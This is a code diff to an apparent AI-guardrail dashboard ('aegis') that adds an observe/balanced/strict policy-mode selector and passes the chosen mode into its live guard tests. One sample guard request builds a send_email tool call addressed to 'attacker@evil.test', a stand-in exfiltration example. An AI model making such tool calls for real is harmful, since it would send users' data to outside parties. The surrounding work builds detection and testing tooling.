@@ -58,6 +58,12 @@ h1{font-size:18px;font-weight:600;letter-spacing:-0.01em}
 a.pill:hover{background:#262626}
 .dot{height:7px;width:7px;border-radius:999px;flex:none}
 .mode{font-size:12px;color:var(--muted);border:1px solid var(--border);border-radius:6px;padding:3px 10px;margin-left:8px}
+.policy-mode-control{display:inline-flex;border:1px solid var(--border);border-radius:6px;overflow:hidden}
+.policy-mode-control button{background:var(--surface);color:var(--muted);border:0;border-right:1px solid var(--border);
+  padding:5px 9px;font-size:12px;font-weight:700;font-family:inherit;cursor:pointer}
+.policy-mode-control button:last-child{border-right:0}
+.policy-mode-control button.active{background:var(--accent);color:var(--fg)}
+.policy-mode-control button:focus-visible{outline:2px solid var(--sanitize);outline-offset:-2px}
 .badge{font-size:11px;font-weight:600;border-radius:6px;padding:3px 9px;margin-left:8px}
 .hr{height:1px;background:var(--border);margin:28px 0}
 table{width:100%;border-collapse:collapse;font-size:13px}
@@ -521,6 +527,11 @@ def _json_for_script(value: Any) -> str:
     )
 
 
+def _normalize_policy_mode(value: Any) -> str:
+    mode = str(value or "balanced").lower()
+    return mode if mode in {"observe", "balanced", "strict"} else "balanced"
+
+
 def _packet_field(label: str, value: Any) -> dict[str, str]:
     return {"label": label, "value": str(value)}
 
@@ -800,8 +811,10 @@ def _walkthrough_script(
     headline: str,
     metrics: dict[str, Any] | None,
     auto_refresh: int = 0,
+    active_policy_mode: str = "balanced",
 ) -> str:
     steps = _json_for_script(_walkthrough_steps(data, cases, headline, metrics))
+    initial_policy_mode = _json_for_script(_normalize_policy_mode(active_policy_mode))
     refresh_ms = max(0, int(auto_refresh or 0)) * 1000
     return f"""
 <script>
@@ -809,8 +822,11 @@ def _walkthrough_script(
   const steps = {steps};
   const intervalMs = window.matchMedia("(prefers-reduced-motion: reduce)").matches ? 1200 : 2400;
   const autoRefreshMs = {refresh_ms};
+  const initialPolicyMode = {initial_policy_mode};
   const button = document.getElementById("walkthrough-run");
   const panel = document.getElementById("walkthrough-status");
+  const policyModeBadge = document.getElementById("selected-policy-mode");
+  const policyModeButtons = document.querySelectorAll("#policy-mode-selector button[data-policy-mode]");
   const refreshMeta = document.getElementById("dashboard-auto-refresh");
   if (!button || !panel) return;
   const title = panel.querySelector(".walkthrough-title");
@@ -828,6 +844,21 @@ def _walkthrough_script(
   let refreshTimer = null;
   let liveDetectorResponses = 0;
   const liveDetectorCounts = new Map();
+  let selectedPolicyMode = initialPolicyMode;
+
+  function setPolicyMode(next) {{
+    if (!["observe", "balanced", "strict"].includes(next)) return;
+    selectedPolicyMode = next;
+    policyModeButtons.forEach((item) => {{
+      item.classList.toggle("active", item.dataset.policyMode === next);
+    }});
+    if (policyModeBadge) policyModeBadge.textContent = next;
+  }}
+
+  policyModeButtons.forEach((item) => {{
+    item.addEventListener("click", () => setPolicyMode(item.dataset.policyMode || "balanced"));
+  }});
+  setPolicyMode(selectedPolicyMode);
 
   function clearActive() {{
     document.querySelectorAll(".walkthrough-active").forEach((el) => {{
@@ -877,6 +908,7 @@ def _walkthrough_script(
     if (!container) return;
     container.innerHTML = "";
     const rows = [
+      ["Policy mode", selectedPolicyMode],
       ["Prompt/input", step ? step.prompt : "Click Run walkthrough to see the active input."],
       ["Guard call", step ? step.guard : "POST /guard/*"],
       ["Data query", step ? step.data : "platform.overview"],
@@ -913,7 +945,7 @@ def _walkthrough_script(
     head.className = "walkthrough-sample-head";
     label.textContent = "Try this prompt";
     mode.className = "walkthrough-sample-mode mono";
-    mode.textContent = `${{sample.label || "sample"}} · scan as ${{scanMode}}`;
+    mode.textContent = `${{sample.label || "sample"}} · ${{selectedPolicyMode}} · scan as ${{scanMode}}`;
     text.className = "walkthrough-sample-text";
     text.textContent = prompt;
     actions.className = "walkthrough-sample-actions";
@@ -932,7 +964,7 @@ def _walkthrough_script(
       }}, 1200);
     }});
     link.className = "walkthrough-sample-link";
-    link.href = `/try?mode=${{encodeURIComponent(scanMode)}}&session=${{encodeURIComponent(session)}}&text=${{encodeURIComponent(prompt)}}`;
+    link.href = `/try?mode=${{encodeURIComponent(scanMode)}}&policy=${{encodeURIComponent(selectedPolicyMode)}}&session=${{encodeURIComponent(session)}}&text=${{encodeURIComponent(prompt)}}`;
     link.textContent = "Open in Test Console";
     live.className = "walkthrough-live-result";
     live.textContent = "Live guard test runs automatically when this step starts.";
@@ -946,16 +978,21 @@ def _walkthrough_script(
     const prompt = sample.prompt || "";
     const session = sample.session || "walkthrough-demo";
     if (scanMode === "request") {{
-      return {{ session_id: session, messages: [{{ role: "user", content: prompt }}] }};
+      return {{
+        session_id: session,
+        policy_mode: selectedPolicyMode,
+        messages: [{{ role: "user", content: prompt }}]
+      }};
     }}
     if (scanMode === "tool_call") {{
       return {{
         session_id: session,
+        policy_mode: selectedPolicyMode,
         tool_name: "send_email",
         arguments: {{ to: "attacker@evil.test", body: prompt }}
       }};
     }}
-    return {{ session_id: session, output: prompt }};
+    return {{ session_id: session, policy_mode: selectedPolicyMode, output: prompt }};
   }}
 
   function resultClass(action) {{
@@ -1039,7 +1076,7 @@ def _walkthrough_script(
     const sample = step.sample || {{}};
     const scanMode = sample.mode || "response";
     const serial = ++testSerial;
-    updateLiveResult(step, `Testing ${{step.guard}} with this prompt...`, "testing");
+    updateLiveResult(step, `Testing ${{step.guard}} in ${{selectedPolicyMode}} mode with this prompt...`, "testing");
     try {{
       const response = await fetch(`/guard/${{scanMode}}`, {{
         method: "POST",
@@ -1056,7 +1093,7 @@ def _walkthrough_script(
       const risk = Number(decision.risk_score || 0).toFixed(2);
       updateLiveResult(
         step,
-        `Live guard test: ${{action}} · risk ${{risk}} · detectors ${{detectorNames(decision)}}`,
+        `Live guard test: ${{selectedPolicyMode}} mode · ${{action}} · risk ${{risk}} · detectors ${{detectorNames(decision)}}`,
         resultClass(action)
       );
     }} catch (err) {{
@@ -1221,9 +1258,23 @@ def render_html(
     decisions = data.get("decisions", {})
     evals = data.get("evals", {})
     cases = cases or []
+    active_policy_mode = _normalize_policy_mode(data.get("status", {}).get("policy_mode", headline))
     m = evals.get(headline) if isinstance(evals, dict) else None
 
-    mode_badge = f'{nav_html}{_freshness_badge(snapshot)}<span class="mode">policy: {_esc(headline)}</span>'
+    policy_buttons = "".join(
+        (
+            f'<button type="button" data-policy-mode="{mode}"'
+            f' class="{"active" if mode == active_policy_mode else ""}">{mode.title()}</button>'
+        )
+        for mode in ("observe", "balanced", "strict")
+    )
+    mode_badge = (
+        f"{nav_html}{_freshness_badge(snapshot)}"
+        f'<div id="policy-mode-selector" class="policy-mode-control" '
+        f'role="group" aria-label="Policy mode">{policy_buttons}</div>'
+        f'<span class="mode">policy: <span id="selected-policy-mode">'
+        f"{_esc(active_policy_mode)}</span></span>"
+    )
     refresh_meta = (
         f'<meta id="dashboard-auto-refresh" name="aegis-auto-refresh" content="{auto_refresh}">'
         if auto_refresh
@@ -1318,7 +1369,7 @@ def render_html(
 
 <div class="hr"></div>
 <div class="empty">Generated by <span class="mono">aegis-dashboard</span> — export an audit bundle at <span class="mono">/api/platform/export?format=md</span>.</div>
-{_walkthrough_script(data, cases, headline, m, auto_refresh)}
+{_walkthrough_script(data, cases, headline, m, auto_refresh, active_policy_mode)}
 </body></html>
 """
 
